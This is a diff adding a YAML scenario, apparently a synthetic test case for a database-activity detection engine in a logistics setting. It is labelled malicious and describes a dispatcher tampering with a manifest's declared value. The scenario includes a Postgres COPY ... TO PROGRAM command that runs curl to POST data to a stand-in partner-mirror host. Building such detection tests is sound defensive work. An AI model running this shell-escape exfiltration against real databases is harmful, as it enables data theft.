@@ -1,0 +1,23 @@
+scenario_id: gen_logistics_83_data_tamper_mal_2351
+family_id: gen_logistics_83_data_tamper_mal_fam2351
+domain: logistics
+time_of_day: 03:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: dispatcher
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: UPDATE manifests SET declared_value = 290093 WHERE shipment_id = 68598
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.20.34.165
+      port: 23
